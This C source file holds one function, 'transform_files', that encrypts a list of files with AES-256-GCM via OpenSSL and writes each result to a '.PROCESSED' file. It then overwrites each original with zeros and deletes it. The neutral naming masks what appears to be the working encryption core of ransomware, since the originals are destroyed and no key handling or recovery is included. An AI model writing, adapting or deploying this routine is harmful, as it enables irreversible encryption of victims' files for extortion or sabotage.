#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <limits.h>
#include <openssl/evp.h>
#include <openssl/rand.h>

void transform_files(const char **file_paths, size_t num_files, const uint8_t *key) {
    if (file_paths == NULL || key == NULL || num_files == 0) {
        return;
    }

    for (size_t i = 0; i < num_files; ++i) {
        const char *path = file_paths[i];
        if (path == NULL) continue;

        FILE *fp = fopen(path, "rb");
        if (fp == NULL) continue;

        if (fseek(fp, 0, SEEK_END) != 0) {
            fclose(fp);
            continue;
        }

        long lsize = ftell(fp);
        if (lsize < 0) {
            fclose(fp);
            continue;
        }

        size_t plaintext_len = (size_t)lsize;

        if (fseek(fp, 0, SEEK_SET) != 0) {
            fclose(fp);
            continue;
        }

        unsigned char *plaintext = calloc(1, plaintext_len == 0 ? 1 : plaintext_len);
        if (plaintext == NULL) {
            fclose(fp);
            continue;
        }

        if (plaintext_len > 0) {
            size_t rd = fread(plaintext, 1, plaintext_len, fp);
            if (rd != plaintext_len) {
                free(plaintext);
                fclose(fp);
                continue;
            }
        }
        fclose(fp);

        unsigned char nonce[12];
        if (RAND_bytes(nonce, sizeof(nonce)) != 1) {
            free(plaintext);
            continue;
        }

        EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
        if (ctx == NULL) {
            free(plaintext);
            continue;
        }

        if (plaintext_len > (size_t)-1 - EVP_MAX_BLOCK_LENGTH) {
            EVP_CIPHER_CTX_free(ctx);
            free(plaintext);
            continue;
        }

        size_t ciphertext_cap = plaintext_len + EVP_MAX_BLOCK_LENGTH;
        unsigned char *ciphertext = calloc(1, ciphertext_cap == 0 ? 1 : ciphertext_cap);
        if (ciphertext == NULL) {
            EVP_CIPHER_CTX_free(ctx);
            free(plaintext);
            continue;
        }

        int ok = 1;
        if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, key, nonce) != 1) {
            ok = 0;
        }

        size_t ciphertext_len = 0;
        size_t offset = 0;
        while (ok && offset < plaintext_len) {
            size_t remaining = plaintext_len - offset;
            int inl = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;
            int outl = 0;

            if (EVP_EncryptUpdate(ctx, ciphertext + ciphertext_len, &outl,
                                  plaintext + offset, inl) != 1) {
                ok = 0;
                break;
            }

            ciphertext_len += (size_t)outl;
            offset += (size_t)inl;
        }

        unsigned char tag[16];
        if (ok) {
            int outl = 0;
            if (EVP_EncryptFinal_ex(ctx, ciphertext + ciphertext_len, &outl) != 1) {
                ok = 0;
            } else {
                ciphertext_len += (size_t)outl;
            }
        }

        if (ok && EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG,
                                      (int)sizeof(tag), tag) != 1) {
            ok = 0;
        }

        EVP_CIPHER_CTX_free(ctx);

        if (!ok) {
            free(ciphertext);
            free(plaintext);
            continue;
        }

        size_t path_len = strlen(path);
        if (path_len > (size_t)-1 - sizeof(".PROCESSED")) {
            free(ciphertext);
            free(plaintext);
            continue;
        }

        char *processed_path = malloc(path_len + sizeof(".PROCESSED"));
        if (processed_path == NULL) {
            free(ciphertext);
            free(plaintext);
            continue;
        }

        memcpy(processed_path, path, path_len);
        memcpy(processed_path + path_len, ".PROCESSED", sizeof(".PROCESSED"));

        FILE *out = fopen(processed_path, "wb");
        if (out == NULL) {
            free(processed_path);
            free(ciphertext);
            free(plaintext);
            continue;
        }

        int write_ok = 1;
        if (fwrite(nonce, 1, sizeof(nonce), out) != sizeof(nonce)) write_ok = 0;
        if (write_ok && ciphertext_len > 0) {
            if (fwrite(ciphertext, 1, ciphertext_len, out) != ciphertext_len) write_ok = 0;
        }
        if (write_ok && fwrite(tag, 1, sizeof(tag), out) != sizeof(tag)) write_ok = 0;

        if (fclose(out) != 0) write_ok = 0;

        if (!write_ok) {
            free(processed_path);
            free(ciphertext);
            free(plaintext);
            continue;
        }

        FILE *orig = fopen(path, "wb");
        if (orig == NULL) {
            write_ok = 0;
        } else {
            unsigned char *zeros = calloc(1, 4096);
            if (zeros == NULL) {
                write_ok = 0;
            } else {
                size_t remaining = plaintext_len;
                while (remaining > 0) {
                    size_t chunk = remaining > 4096 ? 4096 : remaining;
                    if (fwrite(zeros, 1, chunk, orig) != chunk) {
                        write_ok = 0;
                        break;
                    }
                    remaining -= chunk;
                }
                free(zeros);
            }

            if (fclose(orig) != 0) write_ok = 0;
        }

        if (write_ok) {
            (void)remove(path);
        }

        free(processed_path);
        free(ciphertext);
        free(plaintext);
    }
}